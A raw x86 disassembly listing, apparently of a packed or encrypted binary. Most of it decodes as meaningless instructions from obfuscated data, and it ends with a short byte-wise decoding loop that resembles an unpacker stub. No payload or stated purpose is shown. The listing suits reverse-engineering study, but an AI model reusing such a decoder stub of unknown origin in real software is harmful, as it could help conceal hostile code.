  4179b6:	sub    cl,dl
  4179b8:	push   0x78
  4179ba:	inc    ecx
  4179bb:	sub    eax,0x1b8d637d
  4179c0:	adc    DWORD PTR [ecx+0x6972f3df],ebx
  4179c6:	jecxz  0x4179c9
  4179c8:	mov    edx,edx
  4179ca:	rcl    DWORD PTR [esi-0x3115b8e0],0x9e
  4179d1:	push   esp
  4179d2:	push   0xffffffb8
  4179d4:	js     0x417a4a
  4179d6:	or     edi,DWORD PTR [esi]
  4179d8:	lds    edx,FWORD PTR [eax+edi*1]
  4179db:	cmp    eax,0xda2dc07b
  4179e0:	mov    ?,WORD PTR [eax]
  4179e2:	loopne 0x417994
  4179e4:	fwait
  4179e5:	push   0x7313c8c4
  4179ea:	mov    eax,0x5949de0
  4179ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179f0:	ss in  al,dx
  4179f2:	push   ss
  4179f3:	xchg   esp,eax
  4179f4:	fcmove st,st(2)
  4179f6:	dec    esi
  4179f7:	into   
  4179f8:	dec    esp
  4179f9:	je     0x4179f3
  4179fb:	adc    al,0x1b
  4179fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179fe:	pop    ebp
  4179ff:	push   0x7dda1614
  417a04:	gs mov ebp,0xf37a392f
  417a0a:	repnz add bh,BYTE PTR [eax+0x3d4bad99]
  417a11:	inc    edx
  417a12:	push   0x15
  417a14:	cmp    eax,0xfa4b21b0
  417a19:	xchg   DWORD PTR [ebx+0x4eafc735],ebx
  417a1f:	mov    ecx,0x307ed37d
  417a24:	or     al,BYTE PTR [edi-0x6a]
  417a27:	or     DWORD PTR ds:0x9f27ecce,esi
  417a2d:	fsub   QWORD PTR [ebx]
  417a2f:	jne    0x4179e1
  417a31:	adc    bh,dl
  417a33:	inc    edi
  417a34:	xchg   DWORD PTR [ecx-0x50],eax
  417a37:	or     eax,0x8eeac2e8
  417a3c:	outs   dx,DWORD PTR ds:[esi]
  417a3d:	push   ss
  417a3e:	jp     0x417a57
  417a40:	out    dx,eax
  417a41:	mov    es,edx
  417a43:	push   ss
  417a44:	adc    al,0x54
  417a46:	bswap  edi
  417a48:	jno    0x417ac8
  417a4a:	std    
  417a4b:	int    0xa6
  417a4d:	xchg   esi,eax
  417a4e:	out    0x1,al
  417a50:	mov    eax,0x3f9808c9
  417a55:	pop    ebx
  417a56:	mov    esp,0xbc9598e2
  417a5b:	rcl    edx,1
  417a5d:	(bad)  
  417a5e:	aad    0x37
  417a60:	xchg   DWORD PTR [esi+0x4d01eaf8],eax
  417a66:	aas    
  417a67:	in     eax,dx
  417a68:	clc    
  417a69:	ds pop edx
  417a6b:	fs ins DWORD PTR es:[edi],dx
  417a6d:	ficomp WORD PTR [edi-0x44]
  417a70:	jb     0x417a75
  417a72:	cmp    DWORD PTR [ebp-0x6a],ebp
  417a75:	fisubr WORD PTR [esi]
  417a77:	iret   
  417a78:	add    DWORD PTR [edi],edx
  417a7a:	sbb    ah,dl
  417a7c:	pop    edi
  417a7d:	mov    ch,0x47
  417a7f:	retf   0xd92
  417a82:	adc    al,0xaf
  417a84:	mov    dh,0x15
  417a86:	lods   eax,DWORD PTR ds:[esi]
  417a87:	mov    ecx,0xba353e25
  417a8c:	push   ebx
  417a8d:	sub    eax,0x7d87d5c4
  417a92:	lock mov ds:0xd78abd8,eax
  417a98:	scas   al,BYTE PTR es:[edi]
  417a99:	rol    DWORD PTR [ebp-0x3c5207ee],0x24
  417aa0:	shr    BYTE PTR [edi],cl
  417aa2:	rcl    BYTE PTR [ebp-0x79],cl
  417aa5:	pushf  
  417aa6:	jae    0x417aba
  417aa8:	aaa    
  417aa9:	loope  0x417a9d
  417aab:	jmp    0xd311:0x4497876f
  417ab2:	mov    ebp,DWORD PTR ds:0x13d65433
  417ab8:	jmp    0xc2d:0x6cc12279
  417abf:	mov    cs:0x195b97fe,al
  417ac5:	xchg   BYTE PTR [ecx-0x11dac4b3],ah
  417acb:	ret    0xe818
  417ace:	mov    esp,0x4de9f5bb
  417ad3:	jge    0x417ab4
  417ad5:	jle    0x417b2d
  417ad7:	jmp    0xb950b4c
  417adc:	mov    BYTE PTR [ebp+esi*4-0x7],dh
  417ae0:	(bad)  
  417ae1:	push   edi
  417ae2:	cli    
  417ae3:	pop    edi
  417ae4:	jb     0x417ad2
  417ae6:	push   ds
  417ae7:	mov    DWORD PTR [eax-0x72],ebx
  417aea:	inc    ebp
  417aeb:	adc    BYTE PTR [eax+0xb],dl
  417aee:	or     al,0xe6
  417af0:	xchg   edi,eax
  417af1:	adc    DWORD PTR [ecx],0xec640435
  417af7:	outs   dx,BYTE PTR ds:[esi]
  417af8:	ds jecxz 0x417af9
  417afb:	ss mov cl,0xdf
  417afe:	test   BYTE PTR [ebp-0xb],dh
  417b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b02:	add    DWORD PTR [ebx+0x335aa2da],eax
  417b08:	sbb    ah,bl
  417b0a:	sti    
  417b0b:	rcl    DWORD PTR [ebp+0x1],0x8b
  417b0f:	sahf   
  417b10:	retf   0xaeca
  417b13:	aaa    
  417b14:	cmp    DWORD PTR [ebp+0x1],ecx
  417b17:	adc    eax,0xb1b6c23f
  417b1c:	jnp    0x417b41
  417b1e:	jmp    0xfe8740e2
  417b23:	pop    ebp
  417b24:	cld    
  417b25:	inc    edi
  417b26:	jg     0x417b48
  417b28:	aaa    
  417b29:	test   DWORD PTR ds:0xac4305a4,esi
  417b2f:	hlt    
  417b30:	xchg   edx,eax
  417b31:	pavgw  mm7,mm5
  417b34:	jecxz  0x417add
  417b36:	jbe    0x417b4b
  417b38:	push   esi
  417b39:	jle    0x417aff
  417b3b:	and    al,0x46
  417b3d:	sbb    dh,dh
  417b3f:	lea    eax,[ebx+0x24]
  417b42:	test   eax,0x1df62aea
  417b47:	and    al,0xad
  417b49:	mov    DWORD PTR [ebx-0x233a99c4],edi
  417b4f:	mov    ah,0x59
  417b51:	and    BYTE PTR [ebx-0x47],ah
  417b54:	loop   0x417b4d
  417b56:	aad    0x31
  417b58:	call   0xc813:0x252f21b
  417b5f:	inc    ebp
  417b60:	sub    bl,BYTE PTR [ecx]
  417b62:	push   0xfffffffa
  417b64:	or     al,BYTE PTR [edx-0x758cdc0c]
  417b6a:	scas   eax,DWORD PTR es:[edi]
  417b6b:	pusha  
  417b6c:	xchg   esp,eax
  417b6d:	sub    DWORD PTR [esi],esp
  417b6f:	xor    eax,0xcc122b40
  417b74:	sbb    eax,0x18ee78c1
  417b79:	mul    BYTE PTR [esi]
  417b7b:	out    dx,eax
  417b7c:	retf   0xe9d6
  417b7f:	xor    dh,ch
  417b81:	pop    ecx
  417b82:	imul   esp,DWORD PTR [eax],0xffffffe1
  417b85:	mov    ah,BYTE PTR [ebx+0x3da4fbe1]
  417b8b:	rol    DWORD PTR [ecx],cl
  417b8d:	fdivr  st(0),st
  417b8f:	mov    al,0x0
  417b91:	clc    
  417b92:	cld    
  417b93:	adc    BYTE PTR [esp+eiz*4],ch
  417b96:	pop    ebp
  417b97:	mov    ebp,0xc03d4c18
  417b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b9d:	aas    
  417b9e:	pop    ss
  417b9f:	mov    eax,ds:0x770fab9
  417ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ba5:	iret   
  417ba6:	and    eax,0x929d34dd
  417bab:	pop    edx
  417bac:	and    eax,DWORD PTR [ecx-0x36]
  417baf:	mov    edx,0xf7db33f5
  417bb4:	and    DWORD PTR [esi+0x487e2ea3],edx
  417bba:	or     ebp,DWORD PTR [eax+0x69923c27]
  417bc0:	pop    es
  417bc1:	shr    DWORD PTR [edi-0x3d75a4a2],cl
  417bc7:	lods   eax,DWORD PTR ds:[esi]
  417bc8:	mov    ds:0x929d0f6f,eax
  417bcd:	push   ecx
  417bce:	pop    ecx
  417bcf:	ss pop ss
  417bd1:	int    0x6d
  417bd3:	retf   
  417bd4:	mov    dl,BYTE PTR [esi+0x50e37df5]
  417bda:	or     ch,BYTE PTR [ebp+0x72]
  417bdd:	lods   al,BYTE PTR ds:[esi]
  417bde:	inc    ecx
  417bdf:	shl    BYTE PTR ds:0xe0b131dc,1
  417be5:	out    dx,eax
  417be6:	xor    eax,0x14f7cec4
  417beb:	ss adc ebx,ecx
  417bee:	mov    esp,0x1dc7afca
  417bf3:	fs lahf 
  417bf5:	std    
  417bf6:	enter  0x1a57,0x8d
  417bfa:	xchg   ebx,eax
  417bfb:	xor    esp,ebx
  417bfd:	mov    esp,0x7b5ef0a7
  417c03:	repz in eax,dx
  417c05:	loop   0x417c6b
  417c07:	mov    bl,dl
  417c09:	dec    ebp
  417c0a:	sbb    BYTE PTR [edx-0x7b],bh
  417c0d:	push   ecx
  417c0e:	pop    edi
  417c0f:	fild   WORD PTR [eax+0xa96dba4]
  417c15:	and    al,0x74
  417c17:	mov    edx,0xc15c987b
  417c1c:	loopne 0x417bae
  417c1e:	sbb    al,0xeb
  417c20:	ret    0x37cb
  417c23:	fsubrp st(6),st
  417c25:	mov    ebx,0x5e5dac3c
  417c2a:	inc    ebp
  417c2b:	sahf   
  417c2c:	lods   al,BYTE PTR ds:[esi]
  417c2d:	mov    ds:0x31b36e4d,eax
  417c32:	dec    ebp
  417c33:	shl    ch,1
  417c35:	push   esp
  417c36:	psrlq  mm6,QWORD PTR es:[eax+0x560ffc06]
  417c3e:	sub    eax,0x145bafe3
  417c43:	or     DWORD PTR [ebx+edx*2],esi
  417c46:	inc    ebp
  417c47:	adc    al,0x91
  417c49:	jb     0x417c06
  417c4b:	cmc    
  417c4c:	inc    ebx
  417c4d:	jne    0x417c35
  417c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c50:	adc    al,0xca
  417c52:	sti    
  417c53:	mov    ds:0xe2700f22,eax
  417c58:	test   eax,0xc107eaee
  417c5d:	ins    DWORD PTR es:[edi],dx
  417c5e:	jmp    0x14d6b1f2
  417c63:	pop    ecx
  417c64:	jmp    0xd0e6:0x3ce20b8d
  417c6b:	loop   0x417bf2
  417c6d:	iret   
  417c6e:	xlat   BYTE PTR ds:[ebx]
  417c6f:	(bad)  
  417c70:	ja     0x417c90
  417c72:	or     dh,BYTE PTR [ecx-0x263bc3bc]
  417c78:	retf   0x82a3
  417c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c7c:	and    eax,0x8bc0e142
  417c81:	in     al,0x20
  417c83:	mov    ds:0x496e04b0,eax
  417c88:	cld    
  417c89:	outs   dx,DWORD PTR ds:[esi]
  417c8a:	jne    0x417c92
  417c8c:	aad    0x33
  417c8e:	mov    eax,ds:0x9dd712e5
  417c93:	(bad)  
  417c94:	out    0xf5,al
  417c96:	repnz sub dh,ah
  417c99:	je     0x417c34
  417c9b:	xor    BYTE PTR [edi],ch
  417c9d:	mov    eax,ds:0xb03d019
  417ca2:	cmp    DWORD PTR [esi+esi*8+0x3ec17663],esi
  417ca9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  417cab:	jmp    0x417cf1
  417cad:	adc    al,ah
  417caf:	push   ss
  417cb0:	aam    0xf7
  417cb2:	test   eax,0xcf67c866
  417cb7:	(bad)  
  417cb8:	hlt    
  417cb9:	dec    ebp
  417cba:	repz (bad) 
  417cbc:	push   esi
  417cbd:	jns    0x417cdd
  417cbf:	mov    dh,0xf2
  417cc1:	pop    eax
  417cc2:	jns    0x417cfe
  417cc4:	xchg   ebp,eax
  417cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cc6:	jns    0x417d11
  417cc8:	rol    BYTE PTR [ecx],0x7e
  417ccb:	xor    DWORD PTR [ebp+0x6c1b06b9],esi
  417cd1:	int    0x9b
  417cd3:	adc    DWORD PTR [ebx],edi
  417cd5:	and    eax,0x14fe19a2
  417cda:	mov    ch,dh
  417cdc:	mov    al,ds:0x31728737
  417ce1:	mov    bl,0x63
  417ce3:	test   ebx,eax
  417ce5:	pop    ebp
  417ce6:	test   eax,0xb3fe69b5
  417ceb:	(bad)  
  417cec:	jmp    0xf6fb04fc
  417cf1:	lea    edx,[ebp+0x76]
  417cf4:	in     eax,dx
  417cf5:	clc    
  417cf6:	repnz das 
  417cf8:	jnp    0x417d60
  417cfa:	ja     0x417c94
  417cfc:	les    edi,FWORD PTR [ebx-0x75]
  417cff:	xchg   ecx,eax
  417d00:	mov    dl,0xfd
  417d02:	popa   
  417d03:	dec    edx
  417d04:	jb     0x417c94
  417d06:	or     BYTE PTR [ebp-0xb],0xcd
  417d0a:	jl     0x417d37
  417d0c:	repz popf 
  417d0e:	cmp    eax,0xecf88804
  417d13:	adc    BYTE PTR [eax+0x3f],ah
  417d16:	fistp  WORD PTR ds:[eax+0x58264b0a]
  417d1d:	mov    al,ds:0x980969cd
  417d22:	xchg   ebp,eax
  417d23:	enter  0xa9c6,0x1f
  417d27:	mov    eax,ds:0x1b5e83f8
  417d2c:	je     0x417d55
  417d2e:	lea    eax,[edi]
  417d30:	jbe    0x417d5a
  417d32:	ins    DWORD PTR es:[edi],dx
  417d33:	stos   DWORD PTR es:[edi],eax
  417d34:	mov    ebp,0x484e4d60
  417d39:	jo     0x417cd0
  417d3b:	add    al,0x45
  417d3d:	mov    DWORD PTR [ebx],ebp
  417d3f:	das    
  417d40:	jae    0x417cd0
  417d42:	out    0xb4,al
  417d44:	not    DWORD PTR [ecx+0x781fc7f3]
  417d4a:	jb     0x417d81
  417d4c:	inc    ecx
  417d4d:	add    al,0x74
  417d4f:	gs xchg ebp,eax
  417d51:	sub    al,dl
  417d53:	sbb    bl,BYTE PTR [ebp+ebx*2-0x900a06b]
  417d5a:	jmp    0xf288c4da
  417d5f:	sahf   
  417d60:	aas    
  417d61:	mov    esp,0xd0837ba1
  417d66:	jle    0x417d5e
  417d68:	xchg   esp,eax
  417d69:	ret    0x90dd
  417d6c:	mov    ecx,0x32668fcc
  417d71:	xlat   BYTE PTR ds:[ebx]
  417d72:	lods   al,BYTE PTR ds:[esi]
  417d73:	scas   eax,DWORD PTR es:[edi]
  417d74:	mov    dl,bl
  417d76:	repz fdiv QWORD PTR [edx-0x5e]
  417d7a:	je     0x417df0
  417d7c:	mov    eax,ds:0x6e0861ef
  417d81:	mov    edi,0x3cb41a5a
  417d86:	adc    DWORD PTR [ebp+0x41876921],0x5fdc0e55
  417d90:	cmc    
  417d91:	jmp    0xd8f6:0xa6c8071e
  417d98:	in     al,0xbe
  417d9a:	jp     0x417d34
  417d9c:	lock cmp al,0x61
  417d9f:	mov    al,0x6a
  417da1:	xor    edi,0x12
  417da4:	mov    bh,0xa9
  417da6:	fist   WORD PTR [edi]
  417da8:	inc    ecx
  417da9:	hlt    
  417daa:	push   esp
  417dab:	jg     0x417d3a
  417dad:	das    
  417dae:	cli    
  417daf:	addr16 leave 
  417db1:	cmp    al,0xbd
  417db3:	repz mov ebp,0x20eaea2d
  417db9:	dec    BYTE PTR [ecx-0x69]
  417dbc:	inc    esi
  417dbd:	scas   al,BYTE PTR es:[edi]
  417dbe:	hlt    
  417dbf:	idiv   DWORD PTR [edx+0x11]
  417dc2:	cwde   
  417dc3:	push   cs
  417dc4:	je     0x417d77
  417dc6:	cmp    DWORD PTR [esi-0x30],esp
  417dc9:	jae    0x417d9b
  417dcb:	jnp    0x417d7c
  417dcd:	add    eax,0xa6b697b3
  417dd2:	lahf   
  417dd3:	dec    edx
  417dd4:	data16 add al,0x17
  417dd7:	fbstp  TBYTE PTR [ebx]
  417dd9:	push   ecx
  417dda:	mov    ebp,DWORD PTR [edx-0x53]
  417ddd:	pop    edi
  417dde:	xchg   edi,eax
  417ddf:	or     DWORD PTR [esi-0x70],0x8f4f9e63
  417de6:	inc    ebp
  417de7:	aam    0x5d
  417de9:	test   al,0x32
  417deb:	push   ds
  417dec:	cwde   
  417ded:	fadd   st,st(2)
  417def:	mov    ds:0x564f62d9,eax
  417df4:	stos   DWORD PTR es:[edi],eax
  417df5:	mov    ch,dl
  417df7:	aam    0x8b
  417df9:	shl    bh,1
  417dfb:	dec    eax
  417dfc:	jge    0x417e3a
  417dfe:	test   DWORD PTR [ebx+edx*8-0x58],eax
  417e02:	lods   eax,DWORD PTR ds:[esi]
  417e03:	push   cs
  417e04:	mov    esi,DWORD PTR [ebp-0x4]
  417e07:	call   esi
  417e09:	mov    DWORD PTR [ebp-0x3c],eax
  417e0c:	cmp    DWORD PTR [ebp-0x3c],0x57
  417e10:	jne    0x417e1e
  417e12:	mov    edx,DWORD PTR [ebp-0x24]
  417e15:	push   edx
  417e16:	call   0x401000
  417e1b:	add    esp,0x4
  417e1e:	xor    eax,eax
  417e20:	pop    esi
  417e21:	mov    esp,ebp
  417e23:	pop    ebp
  417e24:	ret    
  417e25:	push   ebp
  417e26:	mov    ebp,esp
  417e28:	sub    esp,0x124
  417e2e:	xor    eax,eax
  417e30:	mov    esp,ebp
  417e32:	pop    ebp
  417e33:	ret    
  417e34:	push   ebp
  417e35:	mov    ebp,esp
  417e37:	sub    esp,0x2c
  417e3a:	push   ebx
  417e3b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  417e42:	mov    DWORD PTR [ebp-0xc],0x0
  417e49:	mov    DWORD PTR [ebp-0x20],0x1
  417e50:	mov    DWORD PTR [ebp-0x10],0x0
  417e57:	mov    eax,DWORD PTR [ebp+0xc]
  417e5a:	mov    DWORD PTR [ebp-0x1c],eax
  417e5d:	mov    DWORD PTR [ebp-0x18],0x0
  417e64:	mov    DWORD PTR [ebp-0x8],0x0
  417e6b:	mov    DWORD PTR [ebp-0x24],0x0
  417e72:	mov    ecx,DWORD PTR [ebp-0x4]
  417e75:	sub    ecx,0x1
  417e78:	mov    DWORD PTR [ebp-0x4],ecx
  417e7b:	mov    edx,DWORD PTR [ebp+0x8]
  417e7e:	mov    DWORD PTR [ebp-0x10],edx
  417e81:	mov    DWORD PTR [ebp-0x28],0x1
  417e88:	mov    eax,DWORD PTR [ebp-0x4]
  417e8b:	add    eax,0x2
  417e8e:	mov    DWORD PTR [ebp-0x4],eax
  417e91:	mov    ecx,DWORD PTR [ebp-0x1c]
  417e94:	add    ecx,DWORD PTR [ebp-0x4]
  417e97:	mov    dl,BYTE PTR [ecx+0x1]
  417e9a:	mov    BYTE PTR [ebp-0x11],dl
  417e9d:	mov    eax,DWORD PTR [ebp-0x4]
  417ea0:	add    eax,0x1
  417ea3:	mov    DWORD PTR [ebp-0x4],eax
  417ea6:	mov    cl,BYTE PTR [ebp-0x11]
  417ea9:	mov    BYTE PTR [ebp-0x29],cl
  417eac:	push   edx
  417ead:	pop    ebx
  417eae:	mov    ecx,ebx
  417eb0:	mov    edx,DWORD PTR [ebp-0x10]
  417eb3:	add    edx,DWORD PTR [ebp-0x4]
  417eb6:	mov    al,BYTE PTR [ebp-0x29]
  417eb9:	mov    BYTE PTR [edx],al
  417ebb:	mov    ebx,esi
  417ebd:	mov    ecx,DWORD PTR [ebp+0x14]
  417ec0:	add    ecx,DWORD PTR [ebp-0x8]
  417ec3:	movzx  edx,BYTE PTR [ecx]
  417ec6:	mov    DWORD PTR [ebp-0xc],edx
  417ec9:	mov    eax,DWORD PTR [ebp-0x8]
  417ecc:	mov    ecx,DWORD PTR [ebp-0x28]
  417ecf:	add    eax,ecx
  417ed1:	mov    DWORD PTR [ebp-0x8],eax
  417ed4:	mov    eax,DWORD PTR [ebp-0x8]
  417ed7:	shr    eax,0x3
  417eda:	mov    ecx,0x1
  417edf:	sub    ecx,eax
  417ee1:	mov    DWORD PTR [ebp-0x20],ecx
  417ee4:	shr    eax,cl
  417ee6:	mov    edx,DWORD PTR [ebp-0x8]
  417ee9:	imul   edx,DWORD PTR [ebp-0x20]
  417eed:	mov    DWORD PTR [ebp-0x8],edx
  417ef0:	shl    ebx,0x3
  417ef3:	mov    eax,DWORD PTR [ebp-0x10]
  417ef6:	add    eax,DWORD PTR [ebp-0x4]
  417ef9:	movzx  ecx,BYTE PTR [eax]
  417efc:	add    ecx,DWORD PTR [ebp-0xc]
  417eff:	mov    edx,DWORD PTR [ebp-0x10]
  417f02:	add    edx,DWORD PTR [ebp-0x4]
  417f05:	mov    BYTE PTR [edx],cl
  417f07:	mov    eax,DWORD PTR [ebp-0x4]
  417f0a:	sub    eax,0x2
  417f0d:	mov    DWORD PTR [ebp-0x4],eax
  417f10:	mov    ecx,DWORD PTR [ebp-0x4]
  417f13:	cmp    ecx,DWORD PTR [ebp+0x10]
  417f16:	jl     0x417e88
  417f1c:	pop    ebx
  417f1d:	mov    esp,ebp
  417f1f:	pop    ebp
  417f20:	ret    
  417f21:	int3   
  417f22:	jmp    DWORD PTR ds:0x418008
